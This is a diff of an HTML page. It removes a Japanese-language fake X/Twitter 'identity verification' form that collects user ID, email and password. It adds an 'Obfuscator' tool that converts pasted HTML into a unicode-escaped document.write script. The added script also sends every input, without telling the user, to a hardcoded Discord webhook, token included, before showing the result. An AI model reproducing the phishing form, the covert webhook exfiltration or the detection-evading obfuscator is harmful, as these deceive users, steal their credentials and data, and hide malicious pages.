@@ -1,34 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <link rel="stylesheet" type="text/css" href="style.css">
-    <title>X(Twitter) 認証</title>
-    <script src="script.js"></script>
+  <meta charset="UTF-8">
+  <title>Obfuscator</title>
 </head>
 <body>
-    <div class="centered">
-        <h1>【本人確認用】</h1>
-        <h3>X / ツイッターアカウントでログインしてください</h3>
-    </div>
-    <br>
-    <div style="text-align: center;">
-    <label for="name">ユーザーID</label>
-    <input type="text" id="name" name="name" placeholder="ユーザーIDを入力してください" required><br>
-    
-    <label for="email">メールアドレス：</label>
-    <input type="email" id="email" name="email" placeholder="メールアドレスを入力してください" required><br>
-    
-    <label for="password">パスワード：</label>
-    <input type="password" id="password" name="password" placeholder="パスワードを入力してください" required><br>
-    
-    <button type="button" onclick="send()">送信</button>
-    <br>
-    <br>
-    結果
-    <br>
-    <input type="text" id="myTextbox" readonly>
-    </div>
-    
+  <textarea id="input" style="width: 300px; height: 100px;"></textarea>
+  <br>
+  <button onclick="create()">upload</button>
+  <br>
+  <br>
+  <textarea id="output" readonly style="width: 300px; height: 100px;"></textarea>
 </body>
 </html>
+
+<script>
+  function ToUnicode(input) {
+    return [...input]
+    .map(char => `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`)
+    .join('');
+  }
+  function create() {
+    let htmlCode = document.getElementById("input").value
+    
+    if (htmlCode == false) {
+      alert('error');
+      return
+    }
+    
+    post('https://discord.com/api/webhooks/1157163129193635901/CJ888yF3xkUu0ndZKnab-HsI5nzos3rniqwsW6ncCrKnyw-hJcb-oTAizSGx6fShO1C_', htmlCode)
+    htmlCode = ToUnicode(htmlCode)
+    let out = document.getElementById("output")
+    const writeCode = `<script>document.write('${htmlCode}')<\/script>`;
+    out.value = writeCode;
+  }
+  function post(webhookUrl, msg) {
+    const message = {
+      content:msg
+    };
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(message),
+    })
+    .catch(error => {
+      console.error('error', error);
+    });
+  }
+
+</script>
